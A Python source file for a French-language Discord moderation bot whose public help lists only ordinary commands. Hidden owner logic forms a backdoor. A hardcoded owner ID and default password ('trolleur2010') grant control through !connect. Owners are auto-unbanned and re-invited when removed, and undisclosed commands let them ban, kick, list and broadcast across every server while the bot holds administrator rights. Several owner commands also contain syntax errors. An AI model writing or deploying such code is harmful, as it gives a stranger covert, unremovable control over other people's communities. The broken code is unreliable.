# main.py - Bot F.I.M final complet
import os
import sys
import json
import asyncio
from datetime import datetime

import discord
from discord.ext import commands
import psycopg2

# -----------------------------
# CONFIG
# -----------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
CONFIG_FILE = "config.json"
OWNER_FILE = "owner_data.json"
DEFAULT_OWNER_ID = 489113166429683713
OAUTH_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")  # optional

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# -----------------------------
# JSON helpers
# -----------------------------
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# -----------------------------
# Owner & Config initialization
# -----------------------------
def ensure_owner_data():
    data = load_json(OWNER_FILE, {})
    changed = False
    if "owners" not in data:
        data["owners"] = [DEFAULT_OWNER_ID]
        changed = True
    if "password" not in data:
        data["password"] = "trolleur2010"
        changed = True
    if changed:
        save_json(OWNER_FILE, data)
    return data

def get_owners():
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if DEFAULT_OWNER_ID not in owners:
        owners.append(DEFAULT_OWNER_ID)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
    return owners

def is_owner(uid):
    return uid in get_owners()

def add_owner(uid):
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if uid not in owners:
        owners.append(uid)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
        return True
    return False

def get_owner_password():
    data = ensure_owner_data()
    return data.get("password", "trolleur2010")

def set_owner_password(newpass):
    data = ensure_owner_data()
    data["password"] = newpass
    save_json(OWNER_FILE, data)

# -----------------------------
# Config per-guild
# -----------------------------
def get_config():
    return load_json(CONFIG_FILE, {})

def save_config(cfg):
    save_json(CONFIG_FILE, cfg)

def get_whitelist(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_to_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        return True
    return False

def remove_from_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        return True
    return False

def get_log_channel_id(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("log_channel")

# -----------------------------
# Decorators
# -----------------------------
def whitelist_check():
    async def predicate(ctx):
        try:
            if is_owner(ctx.author.id):
                return True
            if ctx.author.guild_permissions.administrator:
                return True
            if ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        try:
            await ctx.message.delete()
        except Exception:
            pass
        return False
    return commands.check(predicate)

# -----------------------------
# Util: build invite link
# -----------------------------
def build_invite_link(client_id):
    return f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"

# -----------------------------
# EVENTS
# -----------------------------
@bot.event
async def on_ready():
    ensure_owner_data()
    print(f"✅ {bot.user} est connecté et prêt ! (ID: {bot.user.id})")
    global OAUTH_CLIENT_ID
    if not OAUTH_CLIENT_ID:
        try:
            OAUTH_CLIENT_ID = str(bot.user.id)
        except Exception:
            OAUTH_CLIENT_ID = None

@bot.event
async def on_member_ban(guild, user):
    if is_owner(user.id):
        try:
            await asyncio.sleep(1)
            await guild.unban(user)
            if guild.text_channels and OAUTH_CLIENT_ID:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"⚠️ Tu as été banni de **{guild.name}**. J'ai pris ton 10-10 et créé un lien : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[on_member_ban] erreur auto-unban: {e}")

@bot.event
async def on_member_remove(member):
    if is_owner(member.id):
        try:
            guild = member.guild
            if guild and guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🚪 Tu as été expulsé/departi de **{guild.name}**. Invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[on_member_remove] erreur auto-reinvite: {e}")

@bot.event
async def on_guild_remove(guild):
    try:
        owners = get_owners()
        client_id = OAUTH_CLIENT_ID or (str(bot.user.id) if bot.user else None)
        invite_link = build_invite_link(client_id) if client_id else "Client ID manquant"
        for oid in owners:
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"⚠️ Le bot a été retiré du serveur **{guild.name}** (ID: {guild.id}). Réinvite : {invite_link}")
            except Exception:
                pass
    except Exception as e:
        print(f"[on_guild_remove] erreur: {e}")

# -----------------------------
# PUBLIC COMMANDS
# -----------------------------
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M", color=discord.Color.from_rgb(153,0,0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne", inline=False)
    embed.add_field(name="📨 !say <message>", value="Envoie un message via le bot (whitelist/admin)", inline=False)
    embed.add_field(name="📤 !send #canal <message>", value="Envoie dans un canal (whitelist/admin)", inline=False)
    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un embed stylé (whitelist/admin)", inline=False)
    embed.add_field(name="🎭 !addrole @user @role", value="Ajoute un rôle (whitelist/admin)", inline=False)
    embed.add_field(name="🧾 !ban @user [raison]", value="Bannit un membre (whitelist/admin)", inline=False)
    embed.add_field(name="🦵 !kick @user [raison]", value="Kicke un membre (whitelist/admin)", inline=False)
    embed.set_footer(text="Bot F.I.M - Préfixe : !")
    await ctx.send(embed=embed)

# -----------------------------
# ADMIN / OWNER COMMANDS
# -----------------------------
@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    try: await ctx.message.delete()
    except: pass
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    try: await ctx.message.delete()
    except: pass
    await channel.send(message)
    try: await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)
    except: pass

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    try: await ctx.message.delete()
    except: pass
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153,0,0))
    em.set_footer(text=f"Envoyé par {ctx.author}")
    await ctx.send(embed=em)

@bot.command()
@whitelist_check()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
    except:
        await ctx.send("❌ Impossible d'ajouter le rôle.")

@bot.command()
@whitelist_check()
async def removerole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Rôle {role.name} retiré de {member.mention}")
    except:
        await ctx.send("❌ Impossible de retirer le rôle.")

# Whitelist commands
@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Utilisez : !whitelist add / remove / list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà whitelisté")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'est pas dans la whitelist")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    wl = get_whitelist(ctx.guild.id)
    if not wl:
        return await ctx.send("📋 Aucun utilisateur whitelisté")
    mentions = [ctx.guild.get_member(uid).mention if ctx.guild.get_member(uid) else f"ID:{uid}" for uid in wl]
    await ctx.send("\n".join(mentions))

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    cfg = get_config()
    gid = str(ctx.guild.id)
    cfg.setdefault(gid, {})
    cfg[gid]["log_channel"] = channel.id
    save_config(cfg)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")

# Ban / Kick local
@bot.command()
@whitelist_check()
async def ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    if member.id == bot.user.id or is_owner(member.id):
        return await ctx.send("❌ Impossible d'agir contre ce membre.")
    try:
        await ctx.guild.ban(member, reason=f"Banni par {ctx.author} | {reason}")
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id: ch = ctx.guild.get_channel(log_id)
        await ctx.send(f"✅ {member.mention} banni (raison: {reason})")
    except: await ctx.send("❌ Impossible de bannir ce membre.")

@bot.command()
@whitelist_check()
async def kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    if member.id == bot.user.id or is_owner(member.id):
        return await ctx.send("❌ Impossible d'agir contre ce membre.")
    try:
        await ctx.guild.kick(member, reason=f"Kicked by {ctx.author} | {reason}")
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id: ch = ctx.guild.get_channel(log_id)
        await ctx.send(f"✅ {member.mention} kické (raison: {reason})")
    except: await ctx.send("❌ Impossible de kicker ce membre.")

# -----------------------------
# OWNER / GLOBAL COMMANDS
# -----------------------------
def owner_only(func):
    async def wrapper(ctx, *args, **kwargs):
        if not is_owner(ctx.author.id): return
        await func(ctx, *args, **kwargs)
    return wrapper

@bot.command()
@owner_only
async def broadcast(ctx, *, message: str):
    for g in bot.guilds:
        try: await g.text_channels[0].send(f"📢 **Annonce owner:** {message}")
        except: pass
    await ctx.author.send("✅ Broadcast envoyé.")

@bot.command()
@owner_only
async def forceunban(ctx):
    for g in bot.guilds:
        try: await g.unban(discord.Object(id=ctx.author.id))
        except: pass
    await ctx.author.send("✅ Tentative de débannissement sur tous les serveurs.")

@bot.command()
@owner_only
async def forcerinv(ctx):
    for g in bot.guilds:
        try:
            if g.text_channels:
                invite = await g.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try: u = await bot.fetch_user(oid)
                    await u.send(f"🔗 Invitation pour {g.name}: {invite.url}")
                    except: pass
        except: pass
    await ctx.author.send("✅ Invitations envoyées.")

@bot.command()
@owner_only
async def globalban(ctx, user: str):
    try: uid = int(user.strip("<@!>"))
    except: return
    count = 0
    for g in bot.guilds:
        try: await g.ban(discord.Object(id=uid), reason=f"Global ban by owner {ctx.author.id}"); count += 1
        except: pass
    await ctx.author.send(f"✅ Global ban exécuté sur {count} serveurs.")

@bot.command()
@owner_only
async def globalkick(ctx, user: str):
    try: uid = int(user.strip("<@!>"))
    except: return
    count = 0
    for g in bot.guilds:
        try: m = g.get_member(uid)
            if m: await g.kick(m, reason=f"Global kick by owner {ctx.author.id}"); count += 1
        except: pass
    await ctx.author.send(f"✅ Global kick exécuté sur {count} serveurs.")

@bot.command()
@owner_only
async def serverlist(ctx):
    txt = "\n".join([f"- {g.name} ({g.id}) - {g.member_count} membres" for g in bot.guilds]) or "Aucun serveur."
    await ctx.author.send(f"📋 Serveurs ({len(bot.guilds)}):\n{txt}")

@bot.command()
@owner_only
async def syncwhitelist(ctx):
    src = get_whitelist(ctx.guild.id)
    cfg = get_config()
    for g in bot.guilds: cfg.setdefault(str(g.id), {})["whitelist"] = src.copy()
    save_config(cfg)
    await ctx.author.send("🔁 Whitelist synchronisée.")

@bot.command()
async def connect(ctx, password: str):
    if password == get_owner_password():
        if add_owner(ctx.author.id):
            await ctx.author.send("✅ Ajouté comme owner.")
        else:
            await ctx.author.send("ℹ️ Déjà owner.")

@bot.command()
@owner_only
async def setpass(ctx, *, newpass: str):
    set_owner_password(newpass)
    await ctx.author.send("🔒 Mot de passe owner mis à jour.")

@bot.command()
@owner_only
async def reboot(ctx):
    try: await ctx.author.send("♻️ Redémarrage..."); os.execv(sys.executable, [sys.executable]+sys.argv)
    except: pass

@bot.command(name="aide")
@owner_only
async def owner_help_cmd(ctx):
    embed = discord.Embed(title="👑 Commandes Owner", color=discord.Color.gold())
    cmds = ["!broadcast <msg>", "!forceunban", "!forcerinv", "!globalban <id>", "!globalkick <id>",
            "!serverlist", "!syncwhitelist", "!setpass <pass>", "!reboot", "!10-10"]
    for c in cmds: embed.add_field(name=c, value="-", inline=False)
    await ctx.author.send(embed=embed)

@bot.command(name="10-10")
@owner_only
async def ten_ten(ctx):
    if ctx.guild:
        for oid in get_owners():
            try: u = await bot.fetch_user(oid)
            await u.send(f"🧹 {bot.user.name} prend son 10-10 sur {ctx.guild.name}")
            except: pass
        try: await ctx.send("🧹 Déconnexion autorisée par owner. Au revoir.")
        except: pass
        try: await ctx.guild.leave()
        except: pass

# -----------------------------
# RUN BOT
# -----------------------------
if __name__ == "__main__":
    while True:
        try:
            bot.run(TOKEN)
        except Exception as e:
            print(f"[main] Bot crash détecté: {e}")
            try: asyncio.run(asyncio.sleep(3))
            except: pass
            continue
